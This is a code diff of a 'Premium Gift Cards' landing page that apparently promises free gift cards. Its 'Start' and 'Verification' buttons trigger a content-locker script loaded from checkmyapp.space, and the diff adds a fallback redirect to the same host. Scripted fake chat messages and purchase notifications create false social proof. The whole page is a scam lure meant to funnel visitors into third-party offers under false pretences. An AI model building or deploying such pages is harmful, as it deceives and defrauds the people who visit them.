@@ -1,264 +1,266 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Premium Gift Cards</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Gift Cards</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
 
-<script type="text/javascript">var og_autostart = false;</script>
-<script type="text/javascript" id="ogjs" src="https://checkmyapp.space/cl/js/7jvwjk"></script>
+    <script type="text/javascript">
+        var og_autostart = false;
+        var og_autoloader = false;
+        var og_on_load_auto_open = false;
+    </script>
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{
-font-family:'Inter',sans-serif;
-background:#050505;
-color:#fff;
-overflow-x:hidden;
-min-height:100vh;
-}
+    <script type="text/javascript" id="ogjs" src="https://checkmyapp.space/cl/js/7jvwjk"></script>
 
-body::before{
-content:"";
-position:fixed;
-inset:0;
-background:
-radial-gradient(circle at 15% 20%,rgba(59,130,246,.16),transparent 25%),
-radial-gradient(circle at 85% 25%,rgba(168,85,247,.12),transparent 25%),
-radial-gradient(circle at 50% 85%,rgba(34,197,94,.10),transparent 25%);
-animation:bgMove 10s ease-in-out infinite alternate;
-z-index:-2;
-}
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:'Inter',sans-serif;
+            background:#050505;
+            color:#fff;
+            overflow-x:hidden;
+            min-height:100vh;
+        }
 
-body::after{
-content:"";
-position:fixed;
-inset:0;
-background:linear-gradient(135deg,#000,#0b0b0b,#000);
-z-index:-3;
-}
+        body::before{
+            content:"";
+            position:fixed;
+            inset:0;
+            background:
+            radial-gradient(circle at 15% 20%,rgba(59,130,246,.16),transparent 25%),
+            radial-gradient(circle at 85% 25%,rgba(168,85,247,.12),transparent 25%),
+            radial-gradient(circle at 50% 85%,rgba(34,197,94,.10),transparent 25%);
+            animation:bgMove 10s ease-in-out infinite alternate;
+            z-index:-2;
+        }
 
-@keyframes bgMove{
-100%{transform:scale(1.12) translateY(-18px);}
-}
+        body::after{
+            content:"";
+            position:fixed;
+            inset:0;
+            background:linear-gradient(135deg,#000,#0b0b0b,#000);
+            z-index:-3;
+        }
 
-/* --- TT OVERLAY: GIF FULL SCREEN ONLY --- */
-#ttOverlay {
-    position: fixed;
-    inset: 0;
-    background: #000;
-    display: none;
-    z-index: 999999; 
-}
+        @keyframes bgMove{
+            100%{transform:scale(1.12) translateY(-18px);}
+        }
 
-#tutorialGif {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    pointer-events: none;
-}
+        #ttOverlay {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            display: none;
+            z-index: 999999; 
+        }
 
-/* NOTIFICATION STYLE */
-#notification-toast {
-    position: fixed;
-    bottom: 20px;
-    left: 20px;
-    background: rgba(10, 10, 10, 0.98);
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    backdrop-filter: blur(15px);
-    padding: 14px;
-    border-radius: 20px;
-    display: flex;
-    align-items: center;
-    gap: 15px;
-    z-index: 10000;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.8);
-    transform: translateX(-160%);
-    transition: transform 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
-    max-width: 320px;
-}
-#notification-toast.show { transform: translateX(0); }
-.notif-img-container {
-    width: 45px; height: 45px; background: #fff; border-radius: 12px;
-    display: flex; align-items: center; justify-content: center; flex-shrink: 0; padding: 5px;
-}
-.notif-img-container img { width: 100%; height: 100%; object-fit: contain; }
-.notif-content { font-size: 13px; line-height: 1.4; }
-.notif-user { font-weight: 800; color: #60a5fa; }
-.notif-card-name { color: #a855f7; font-weight: 700; }
-.notif-time { display: block; font-size: 10px; opacity: 0.5; margin-top: 3px; }
+        #tutorialGif {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            pointer-events: none;
+        }
 
-.header{text-align:center;padding:34px 15px 20px}
-.title{
-font-size:34px;
-font-weight:800;
-background:linear-gradient(90deg,#fff,#60a5fa,#a855f7);
--webkit-background-clip:text;
--webkit-text-fill-color:transparent;
-}
-.sub{margin-top:10px;font-size:14px;opacity:.65}
+        #notification-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(10, 10, 10, 0.98);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            padding: 14px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            z-index: 10000;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+            transform: translateX(-160%);
+            transition: transform 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            max-width: 320px;
+        }
+        #notification-toast.show { transform: translateX(0); }
+        .notif-img-container {
+            width: 45px; height: 45px; background: #fff; border-radius: 12px;
+            display: flex; align-items: center; justify-content: center; flex-shrink: 0; padding: 5px;
+        }
+        .notif-img-container img { width: 100%; height: 100%; object-fit: contain; }
+        .notif-content { font-size: 13px; line-height: 1.4; }
+        .notif-user { font-weight: 800; color: #60a5fa; }
+        .notif-card-name { color: #a855f7; font-weight: 700; }
+        .notif-time { display: block; font-size: 10px; opacity: 0.5; margin-top: 3px; }
 
-.grid{
-display:grid;
-grid-template-columns:repeat(2,1fr);
-gap:18px;
-padding:18px;
-max-width:580px;
-margin:auto;
-}
+        .header{text-align:center;padding:34px 15px 20px}
+        .title{
+            font-size:34px;
+            font-weight:800;
+            background:linear-gradient(90deg,#fff,#60a5fa,#a855f7);
+            -webkit-background-clip:text;
+            -webkit-text-fill-color:transparent;
+        }
+        .sub{margin-top:10px;font-size:14px;opacity:.65}
 
-.card{
-background:rgba(255,255,255,.05);
-border:1px solid rgba(255,255,255,.06);
-border-radius:24px;
-padding:14px;
-cursor:pointer;
-transition:.25s ease;
-backdrop-filter:blur(12px);
-box-shadow:0 15px 30px rgba(0,0,0,.45);
-}
+        .grid{
+            display:grid;
+            grid-template-columns:repeat(2,1fr);
+            gap:18px;
+            padding:18px;
+            max-width:580px;
+            margin:auto;
+        }
 
-.card:hover{transform:translateY(-6px);}
+        .card{
+            background:rgba(255,255,255,.05);
+            border:1px solid rgba(255,255,255,.06);
+            border-radius:24px;
+            padding:14px;
+            cursor:pointer;
+            transition:.25s ease;
+            backdrop-filter:blur(12px);
+            box-shadow:0 15px 30px rgba(0,0,0,.45);
+        }
 
-.card img{
-width:100%;
-height:125px;
-object-fit:contain;
-background:#fff;
-padding:14px;
-border-radius:18px;
-}
+        .card:hover{transform:translateY(-6px);}
 
-.name{margin-top:12px;font-size:15px;font-weight:800}
-.price{margin-top:6px;font-size:13px;opacity:.75}
+        .card img{
+            width:100%;
+            height:125px;
+            object-fit:contain;
+            background:#fff;
+            padding:14px;
+            border-radius:18px;
+        }
 
-.tag{
-display:inline-block;
-margin-top:10px;
-padding:6px 10px;
-border-radius:999px;
-font-size:11px;
-background:rgba(96,165,250,.14);
-color:#93c5fd;
-transition: all 0.4s ease;
-}
+        .name{margin-top:12px;font-size:15px;font-weight:800}
+        .price{margin-top:6px;font-size:13px;opacity:.75}
 
-/* LIVE CHAT AREA */
-.chat-container {
-    max-width: 580px;
-    margin: 40px auto 20px;
-    padding: 0 18px;
-}
-.chat-box {
-    background: rgba(255, 255, 255, 0.03);
-    border: 1px solid rgba(255, 255, 255, 0.08);
-    border-radius: 20px;
-    padding: 20px;
-    height: 300px;
-    overflow-y: auto;
-    display: flex;
-    flex-direction: column;
-    gap: 15px;
-    scrollbar-width: none;
-}
-.chat-box::-webkit-scrollbar { display: none; }
-.chat-msg {
-    background: rgba(255, 255, 255, 0.05);
-    padding: 12px 16px;
-    border-radius: 15px;
-    border-left: 3px solid #60a5fa;
-    animation: fadeInChat 0.5s ease;
-}
-@keyframes fadeInChat { from { opacity:0; transform: translateY(5px); } to { opacity:1; transform: translateY(0); } }
-.chat-user { font-size: 13px; font-weight: 800; color: #60a5fa; display: flex; justify-content: space-between; }
-.chat-text { font-size: 14px; margin-top: 5px; opacity: 0.9; }
+        .tag{
+            display:inline-block;
+            margin-top:10px;
+            padding:6px 10px;
+            border-radius:999px;
+            font-size:11px;
+            background:rgba(96,165,250,.14);
+            color:#93c5fd;
+            transition: all 0.4s ease;
+        }
 
-.loading{
-position:fixed;
-inset:0;
-background:rgba(0,0,0,.92);
-display:none;
-justify-content:center;
-align-items:center;
-flex-direction:column;
-z-index:999;
-}
-.spinner{
-width:62px;height:62px;
-border-radius:50%;
-border:4px solid rgba(255,255,255,.08);
-border-top:4px solid #60a5fa;
-animation:spin 1s linear infinite;
-}
-@keyframes spin{100%{transform:rotate(360deg)}}
+        .chat-container {
+            max-width: 580px;
+            margin: 40px auto 20px;
+            padding: 0 18px;
+        }
+        .chat-box {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 20px;
+            padding: 20px;
+            height: 300px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            scrollbar-width: none;
+        }
+        .chat-box::-webkit-scrollbar { display: none; }
+        .chat-msg {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 12px 16px;
+            border-radius: 15px;
+            border-left: 3px solid #60a5fa;
+            animation: fadeInChat 0.5s ease;
+        }
+        @keyframes fadeInChat { from { opacity:0; transform: translateY(5px); } to { opacity:1; transform: translateY(0); } }
+        .chat-user { font-size: 13px; font-weight: 800; color: #60a5fa; display: flex; justify-content: space-between; }
+        .chat-text { font-size: 14px; margin-top: 5px; opacity: 0.9; }
 
-.offerPage{display:none;padding:20px}
-.box{
-max-width:540px;
-margin:auto;
-background:rgba(255,255,255,.05);
-border:1px solid rgba(255,255,255,.06);
-border-radius:24px;
-padding:22px;
-}
+        .loading{
+            position:fixed;
+            inset:0;
+            background:rgba(0,0,0,.92);
+            display:none;
+            justify-content:center;
+            align-items:center;
+            flex-direction:column;
+            z-index:999;
+        }
+        .spinner{
+            width:62px;height:62px;
+            border-radius:50%;
+            border:4px solid rgba(255,255,255,.08);
+            border-top:4px solid #60a5fa;
+            animation:spin 1s linear infinite;
+        }
+        @keyframes spin{100%{transform:rotate(360deg)}}
 
-.selectedImage{
-width:100%;
-height:190px;
-object-fit:contain;
-background:#fff;
-padding:18px;
-border-radius:18px;
-margin-bottom:16px;
-}
+        .offerPage{display:none;padding:20px}
+        .box{
+            max-width:540px;
+            margin:auto;
+            background:rgba(255,255,255,.05);
+            border:1px solid rgba(255,255,255,.06);
+            border-radius:24px;
+            padding:22px;
+        }
 
-#selectedTitle{font-size:28px;font-weight:800}
+        .selectedImage{
+            width:100%;
+            height:190px;
+            object-fit:contain;
+            background:#fff;
+            padding:18px;
+            border-radius:18px;
+            margin-bottom:16px;
+        }
 
-.option{
-display:flex;
-justify-content:space-between;
-align-items:center;
-padding:15px;
-margin-top:12px;
-border-radius:16px;
-background:rgba(255,255,255,.04);
-}
+        #selectedTitle{font-size:28px;font-weight:800}
 
-.opt{
-font-size:14px;
-font-weight:700;
-opacity:.9;
-}
+        .option{
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding:15px;
+            margin-top:12px;
+            border-radius:16px;
+            background:rgba(255,255,255,.04);
+        }
 
-.option button,.back{
-border:none;
-cursor:pointer;
-font-weight:700;
-border-radius:12px;
-padding:11px 16px;
-color:#fff;
-}
+        .opt{
+            font-size:14px;
+            font-weight:700;
+            opacity:.9;
+        }
 
-.option button{
-background:linear-gradient(90deg,#22c55e,#16a34a);
-}
+        .option button,.back{
+            border:none;
+            cursor:pointer;
+            font-weight:700;
+            border-radius:12px;
+            padding:11px 16px;
+            color:#fff;
+        }
 
-.back{
-width:100%;
-margin-top:16px;
-background:#1f2937;
-}
+        .option button{
+            background:linear-gradient(90deg,#22c55e,#16a34a);
+        }
 
-.footer{text-align:center;padding:26px;font-size:12px;opacity:.45}
+        .back{
+            width:100%;
+            margin-top:16px;
+            background:#1f2937;
+        }
 
-@media(max-width:480px){
-.grid{grid-template-columns:1fr}
-.title{font-size:28px}
-#selectedTitle{font-size:23px}
-#notification-toast { left: 10px; right: 10px; bottom: 10px; width: auto; }
-}
-</style>
+        .footer{text-align:center;padding:26px;font-size:12px;opacity:.45}
+
+        @media(max-width:480px){
+            .grid{grid-template-columns:1fr}
+            .title{font-size:28px}
+            #selectedTitle{font-size:23px}
+            #notification-toast { left: 10px; right: 10px; bottom: 10px; width: auto; }
+        }
+    </style>
 </head>
 
 <body>
@@ -280,8 +282,8 @@ background:#1f2937;
 </div>
 
 <div class="header">
-<div class="title">PREMIUM GIFT CARDS</div>
-<div class="sub">Select your card and continue</div>
+    <div class="title">PREMIUM GIFT CARDS</div>
+    <div class="sub">Select your card and continue</div>
 </div>
 
 <div class="grid" id="grid">
@@ -331,24 +333,24 @@ background:#1f2937;
 </div>
 
 <div class="loading" id="loading">
-<div class="spinner"></div>
-<p style="margin-top:15px;opacity:.8;">Loading...</p>
+    <div class="spinner"></div>
+    <p style="margin-top:15px;opacity:.8;">Loading...</p>
 </div>
 
 <div class="offerPage" id="offerPage">
-<div class="box">
-<img id="selectedImage" class="selectedImage">
-<div id="selectedTitle"></div>
-<div class="option"><div class="opt">Fast Verification</div><button onclick="go()">Start</button></div>
-<div class="option"><div class="opt">Backup Option</div><button onclick="go()">Start</button></div>
-<button class="back" onclick="backPage()">← Back</button>
-</div>
+    <div class="box">
+        <img id="selectedImage" class="selectedImage">
+        <div id="selectedTitle"></div>
+        <div class="option"><div class="opt">Fast Verification</div><button onclick="go()">Start</button></div>
+        <div class="option"><div class="opt">Backup Option</div><button onclick="go()">Start</button></div>
+        <button class="back" onclick="backPage()">← Back</button>
+    </div>
 </div>
 
 <div class="footer">© 2026 Premium Gift Cards</div>
 
 <script>
-// --- MESSAGES ARE BACK ---
+// --- MESSAGES FULL LIST ---
 const giftCardMsgs = [
     "Fuck! I only got $10 card while others got $100. My luck is literally trash.",
     "Is this actually real? I've been scammed 4 times today on other sites.",
@@ -430,8 +432,14 @@ function openOffer(title,el){
     },900);
 }
 
+// تشغيل اللوكير فقط عند الضغط
 function go(){ 
-    og_load(); 
+    if(typeof og_load === 'function') {
+        og_load(); 
+    } else {
+        // حلا احتياطيا إلى كان السكريبت باقي ما تشرجاش
+        window.location.href = "https://checkmyapp.space/cl/i/7jvwjk";
+    }
 }
 
 function backPage(){ 
